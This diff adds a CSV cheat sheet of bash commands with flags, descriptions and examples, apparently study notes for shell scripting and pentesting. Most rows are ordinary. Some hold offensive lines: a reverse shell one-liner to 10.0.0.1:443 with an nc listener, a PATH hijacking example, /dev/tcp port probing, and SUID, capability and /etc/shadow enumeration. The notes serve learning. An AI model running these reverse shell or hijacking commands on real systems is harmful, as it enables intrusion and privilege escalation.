@@ -1,0 +1,170 @@
+Command,Parameter,Description,Example
+echo,$SHELL,"Variable holding the path of the shell in use (bash, zsh)",echo $SHELL
+echo,$ZSH_VERSION,Variable holding the zsh version (empty if you're not in zsh),echo $ZSH_VERSION
+echo,$BASH_VERSION,Variable holding the bash version,echo $BASH_VERSION
+echo,$?,"Exit code of the last command (0 = success, anything else = error)",ls /doesnotexist ; echo $?
+echo,$PATH,Variable holding the folders where the system looks for commands,echo $PATH
+echo,"\$ \"" \\","Backslash escapes a character so it's taken literally (\$, \"", \\)","echo ""string \$test""; echo ""C:\\Users\\user"""
+echo,$'...',$'...' interprets \t and \n without needing -e,echo $'hello\tbye'
+echo,-e,"Enables special characters (\n, \t) in the printed text","echo -e ""line1\nline2"""
+echo,$a+$b,Concatenates the text of both variables; it does NOT add (use $((a+b)) for that),echo $a+$b
+echo,$USER,Variable with the current user,echo $USER
+echo,$PWD,Variable with the current directory,echo $PWD
+echo,$OLDPWD,Variable with the previous directory,echo $OLDPWD
+echo,$TERM,Variable with the terminal type,echo $TERM
+echo,$HOSTNAME,Variable with the machine name (may be empty in zsh),echo $HOSTNAME
+cat,/etc/shells,File listing the shells installed and available,cat /etc/shells
+cat,/etc/passwd,"File with basic user info (UID, home, shell)",cat /etc/passwd
+cat,/proc/net/tcp,"Virtual file with the active TCP connections (IPs, ports and state) in hexadecimal",cat /proc/net/tcp
+cat,<< 'EOF',Heredoc: writes everything up to EOF into a file from the terminal,cat > /tmp/file.sh << 'EOF'\n...\nEOF
+grep,-v,Excludes the lines that match,"cat /etc/passwd | grep -v ""nologin"""
+grep,-E,Extended regex: lets you search several words separated by |,"cat /etc/passwd | grep -vE ""nologin|false"""
+grep,-vE,Excludes lines matching several patterns separated by | ([ is escaped with \),"grep -vE ""local|\["""
+grep,^pattern$,^ anchors the start of the line and $ the end; together they match exactly,"grep ""^test$"" rockyou.txt"
+grep,-oE,"Shows only the match, with extended regex (good for extracting emails)","grep -oE '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}' file.txt"
+grep,-q,"Quiet: shows nothing, only sets the exit code","grep -q ""root"" /etc/passwd && echo found"
+grep,-qE,Quiet + extended regex; good to validate formats like an IP,"echo ""$ip"" | grep -qE '^[0-9]{1,3}(\.[0-9]{1,3}){3}$'"
+grep,-oP,"-o shows only the matching part and -P enables Perl regex (\K drops what came before, (?=...) checks what comes after); this one extracts what's between brackets",grep -oP '\[\K.*?(?=\])' output.txt
+ps,aux,"Shows every process of every user, with its owner",ps aux | grep root | head
+ping,-c,Number of packets to send,ping -c 1 192.168.100.1
+ping,-W,Maximum seconds to wait for a reply,ping -c 1 -W 1 192.168.100.1
+timeout,"1 bash -c """"","Runs a command with a 1-second limit; if it doesn't finish, it's cancelled","timeout 1 bash -c ""echo > /dev/tcp/127.0.0.1/22"" && echo ""open"""
+chmod,+x,Gives execute permission,chmod +x example.sh
+chmod,u-x,"Removes execute from the owner (u owner, g group, o others)",chmod u-x script.sh
+chmod,-x,Removes execute permission from everyone,chmod -x script.sh
+chmod,o-rx,Removes read and execute from others,chmod o-rx script.sh
+chmod,755,"Octal notation: r=4, w=2, x=1, added up per block (owner, group, others); 755 means rwxr-xr-x and 777 means full permissions for everyone",chmod 755 script.sh
+chmod,700,"Octal rwx------: only the owner can read, write and run it",chmod 700 script.sh
+find,-perm,Filters by the file's specific permissions,find / -perm -4000 2>/dev/null
+find,-type,Filters by type: file (f) or directory (d),find /home -type f
+find,-perm -o+w,Finds files that others can write to,"find / -type f -name ""*.sh"" -user root -perm -o+w 2>/dev/null"
+find,-perm -2000,Finds files with the SGID permission,find / -perm -2000 2>/dev/null
+find,-name,Searches for files by exact name or with wildcards,find -name '*xampl*.sh'
+find,-user,Filters by owning user,find /home -user john
+find,-writable,Shows only files you have write permission on,find /etc -writable 2>/dev/null
+getcap,-r,Searches for and shows capabilities recursively through subfolders,getcap -r / 2>/dev/null
+/dev/tcp/$ip/$port,/dev/udp/$ip/$port,"Same pseudo-device for UDP; both only work in Bash, not in zsh",echo '' > /dev/udp/192.168.100.1/53
+/dev/tcp/$ip/$port,bash -i >& ... 0>&1,Reverse shell one-liner: sends an interactive bash to a listener,bash -i >& /dev/tcp/10.0.0.1/443 0>&1
+(command),(command) 2>/dev/null,Redirecting the subshell hides the errors of the command inside it,(echo '' > /dev/tcp/192.168.100.1/22) 2>/dev/null
+#!/bin/bash,#!/usr/bin/bash,"Same as #!/bin/bash, using the other usual path of bash",#!/usr/bin/bash
+#!/bin/bash,#!/bin/sh,Runs the script with sh (dash or bash depending on the system); no arrays,#!/bin/sh
+#!/bin/bash,#!/usr/bin/python3,Shebang for a Python 3 script,#!/usr/bin/python3
+#!/bin/bash,#!/usr/bin/perl,Shebang for a Perl script,#!/usr/bin/perl
+#!/bin/bash,#!/usr/bin/env bash,Portable shebang: looks for bash in the PATH instead of a fixed path,#!/usr/bin/env bash
+which,/usr/bin/bash /bin/bash /usr/bin/zsh /bin/zsh,Typical paths where the shells live,which bash
+ls,-l /usr/bin/sh,"On a link, shows where it points (sh → dash or bash)",ls -l /usr/bin/sh
+ls,-l,"Detailed listing (permissions, owner, size, date)",ls -l /etc
+sudo,pacman -S,Arch Linux: installs a package,sudo pacman -S dash
+sudo,su,Switches to the root session permanently until you exit,sudo su
+ln,-sf,Creates a symbolic link and replaces it if it already exists,sudo ln -sf /usr/bin/dash /usr/bin/sh
+ln,-s,Creates a symbolic link (a shortcut that points to the original path),ln -s /etc/hosts hosts_link
+bash,script.sh,"Runs the script with bash, even without execute permission",bash script.sh
+bash,-c,Runs the command string passed to it (handy to test in a subshell),bash -c 'echo $test'
+uname,-m,Shows the system architecture,uname -m
+uname,-r,Shows only the kernel version,uname -r
+uname,-a,"Shows all the system information (kernel, hostname, architecture)",uname -a
+readlink,-f,Follows every link to the real path; with /proc/$$/exe shows the real shell running,readlink -f /proc/$$/exe
+uptime,-p,Shows the uptime in a readable format,uptime -p
+ip,a,Lists the interfaces with their IP addresses,ip a | grep inet | head -n 1 | awk '{print $2}'
+ip,-4 addr show,Shows the IPv4 of an interface; pair it with grep -oP to pull just the IP,ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
+declare,-a,Declares the variable as an array,declare -a my_array=(1 2 3 4)
+array=(1 2 3),${array[0]},Gives the first element (the braces are required),echo ${my_array[0]}
+array=(1 2 3),${array[@]},Shows all the elements,echo ${my_array[@]}
+head,-n 1,Shows only the first line of the file or text,head -n 1 file.txt
+head,-c,Keeps the first N characters (bytes),cat /dev/urandom | tr -dc 'a-z' | head -c 16
+$(( )),**,Raises to a power,echo $((2 ** 8))
+$(( )),/,"Divides, keeping only the integer part",echo $((10 / 3))
+bc,scale=2,Sets how many decimals bc uses,"echo ""scale=2; 10/3"" | bc"
+awk,-F,Sets the field separator,awk -F: '{print $2}' /etc/passwd
+awk,'{print $1}',Prints the first column of each line,ls -l | awk '{print $1}'
+awk,NR>1 {print $N},Skips the first line (the header) and prints a field,ss -tn | awk 'NR>1 {print $5}'
+set,-u,Aborts the script if you use an undefined variable,set -u
+"variable=""Hello""",${name:-default},"Uses 'default' if the variable is empty, without assigning it",echo ${name:-Marcelo}
+"variable=""Hello""",${name:=default},Uses 'default' and also assigns it to the variable,echo ${name:=Marcelo}
+dig,+short,Shows only the resolved IP,dig +short scanme.nmap.org
+nc,-nlvp,"Leaves a listener on a port (n no DNS, l listen, v verbose, p port)",nc -nlvp 443
+tr,"' ' ','",Replaces spaces with commas,"echo ""a b c"" | tr ' ' ','"
+tr,':' ' ',"Replaces every "":"" with a space in the processed text","echo ""a:b:c"" | tr ':' ' '"
+tr,' ' '\n',Turns spaces into newlines,"echo ""a b c"" | tr ' ' '\n'"
+tr,-dc,Deletes everything that's NOT in the given set (delete complement),cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 16
+"$1, $2...",${1:-default},"Takes the first argument, or a default value if there isn't one",target=${1:-scanme.nmap.org}
+"$1, $2...",${10},"From argument 10 on, you need braces",echo ${10}
+rm,-r /tmp/$var,Careful: if the variable is empty it becomes rm -r /tmp; quote and check it,"rm -r ""/tmp/$dir"""
+$(),`command`,"Backticks do the same as $(...), capturing a command's output (he prefers $(...))",ip=`whoami`
+xargs,(join lines),"With no command, joins all the lines into a single one",cat ips.txt | xargs
+sort,-u,Sorts and removes repeated lines,sort -u output.txt
+sort,-rn,"Sorts numerically, highest to lowest",sort -rn counts.txt
+sort,-n,Sorts numerically instead of alphabetically,sort -n numbers.txt
+tail,-n 1,Shows only the last line of the file or text,tail -n 1 file.txt
+tail,-1,Short form of tail -n 1 (the last line),dig +short domain | tail -1
+source,~/.bashrc,Config files like ~/.bashrc and ~/.bash_profile are loaded with source,source ~/.bashrc
+export,PATH=dir:$PATH,Puts a directory first in the PATH; base of PATH hijacking,export PATH=/tmp/evil:$PATH
+export,variable_name,Turns a variable into an environment variable available to other processes,"export MY_VAR=""hello"""
+unset,variable,Removes a variable,unset my_var
+unset,array[0],Deletes the first element of the array,unset my_array[0]
+read,-ra ... <<<,Reads text into an array; <<< (here-string) feeds the text to read,"IFS=',' read -ra ports <<< ""$list"""
+read,-r,Reads backslashes as literal text (raw),read -r line
+read,-a,Stores the input as an array,read -a items
+read,-p,Shows a prompt before reading from the keyboard,"read -p ""Type something: "" answer"
+read,-rp,Combines -r (raw) and -p (prompt),"read -rp ""Enter IP: "" ip"
+lsof,-i:,Filters the output to show only connections related to the given port,sudo lsof -i:80
+wc,-l,Counts the lines,find / -perm -4000 2>&1 | wc -l
+ss,-tln,Shows the listening TCP ports (no name resolution),ss -tln
+ss,-tn,Shows the established TCP connections,ss -tn
+ss,-nltp,"Shows listening TCP sockets without resolving names, including the process behind each one",sudo ss -nltp
+uniq,-c,Counts how many times each line repeats,sort ips.txt | uniq -c
+tee,-a,Shows the output and appends it to the file without overwriting,command | tee -a output.txt
+mkdir,-p,"Doesn't fail if the folder exists, and can create nested paths",mkdir -p a/b/c
+xxd,-l,Limits the output to N bytes,xxd -p -l 32 /dev/urandom
+xxd,-p,"Shows plain hexadecimal output, without addresses or text alongside",xxd -p file.bin
+cut,"-f1,7",Extracts several fields at once (here 1 and 7),"cut -d: -f1,7 /etc/passwd"
+cut,-d,Sets the delimiter used to split the text into columns,"cut -d "":"" -f 1 /etc/passwd"
+cut,-f,Selects the field (column) number to extract,"cut -d "":"" -f 3 /etc/passwd"
+dd,if= of=,Input file (if) and output file (of),dd if=/dev/zero of=file.txt
+dd,bs= count=,Block size (bs) and number of blocks (count),dd if=/dev/zero of=file.txt bs=1M count=1
+>,> file,"On its own, empties a file without deleting it",> log.txt
+curl,-o,Where to save the output (/dev/null to discard the body),"curl -s -o /dev/null -w ""%{http_code}"" https://site"
+curl,-w,"Chooses what to print, e.g. %{http_code} for the HTTP code","curl -s -o /dev/null -w ""%{http_code}"" https://site"
+curl,--connect-timeout,Sets a maximum time to connect,curl --connect-timeout 2 http://ip
+curl,-s,Silent mode: hides the progress bar and error messages,curl -s https://example.com
+curl,-X GET,"Sets the request's HTTP method (GET, POST, PUT...)",curl -s -X GET https://example.com
+kill,-15,SIGTERM: ends the process in an orderly way (exit code 143),kill -15 $!
+kill,-9,Forces the process to end immediately (SIGKILL),kill -9 1234
+date,+%Y-%m-%d %H:%M:%S,"Format: %Y year, %m month, %d day, %H hour, %M minute, %S second",date '+%Y-%m-%d %H:%M:%S'
+exit,2,Ends the script with code 2 (wrong usage / not found),exit 2
+exit,0,"Ends the script with exit code 0, signalling success",exit 0
+exit,1,"Ends the script with exit code 1, signalling an error",exit 1
+pgrep,-x,Matches the exact process name,pgrep -x nginx
+wait,$!,Waits for a background process and collects its exit code,sleep 5 & wait $!
+(( )),((var++)),Increments a counter (same as var=$((var+1))),((up_hosts++))
+(( )),(( a > b )),"Arithmetic comparison without $ or quotes (>, <, >=, <=, ==, && )",(( port > 0 && port <= 65535 ))
+(( )),((var+=5)),"Compound arithmetic assignment (+=, -=, **, ...)",((counter += 5))
+if,=,Compares two strings (equal),"[ ""$name"" = ""sabitar"" ]"
+if,!=,Compares two strings (not equal),"[ ""$name"" != ""test"" ]"
+if,-z,True if the variable is empty,"[ -z ""$var"" ]"
+if,-n,True if the variable has content (always quote it),"[ -n ""$var"" ]"
+if,-e,True if it exists (any type),[ -e /etc/passwd ]
+if,-d,True if it's a directory,"[ -d ""$HOME/.ssh"" ]"
+if,-r,True if you can read it,[ -r /etc/shadow ]
+if,-w,True if you can write it,[ -w /etc/crontab ]
+if,-x,True if you can run it,"[ -x ""$(pwd)/script.sh"" ]"
+if,-s,True if it exists and is not empty,[ -s file.txt ]
+if,-L,True if it's a symbolic link,[ -L /usr/bin/sh ]
+if,-p,True if it's a named pipe,[ -p mypipe ]
+if,-S,True if it's a socket,[ -S /var/run/docker.sock ]
+if,-t,True if there's an interactive terminal (-t 0 checks stdin),[ -t 0 ]
+if,-nt,True if the first file is newer than the second (newer than),[ /etc/passwd -nt /tmp/passwd ]
+if,-ot,True if the first file is older than the second (older than),[ /etc/passwd -ot /etc/hosts ]
+if,-a,AND inside a single [ ] (fragile; prefer [ ] && [ ]),"[ ""$u"" = root -a -f /etc/passwd ]"
+if,-o,OR inside a single [ ] (prefer [ ] || [ ]),[ -f a -o -f b ]
+id,-u,Shows your UID (0 = root),"[ ""$(id -u)"" -eq 0 ]"
+ssh-keygen,-f,Sets the path/name of the key files,ssh-keygen -f ~/.ssh/my_key
+[[ ]],==,"Glob pattern match, pattern without quotes: *.py, arch*, *chi*",[[ $name == *.py ]]
+[[ ]],=~,Matches against an extended regex (regex without quotes); fills BASH_REMATCH,"[[ $ip =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]"
+[[ ]],< >,Compares strings in alphabetical (lexicographic) order,[[ abc < def ]]
+[[ ]],&& ||,Joins conditions inside a single [[ ]] (they error inside [ ]),[[ $u == root && $uid -eq 0 ]]
+[[ ]],@(a|b),extglob: matches one of several alternatives (needs shopt -s extglob),[[ $f == *.@(tar|gz|zip) ]]
+[[ ]],!(...),extglob: matches everything except those,[[ $f == !(*.sh|*.py) ]]
+function name(){ commands },local,Creates a variable that only exists inside the function,"local file=""$1"""
+shopt,-s,Enables (sets) a shell option,shopt -s extglob
+vi,:%s/old/new/g,"In Vim/Neovim, replaces in the whole file (% = whole file, g = all per line)",:%s/local_port/port/g
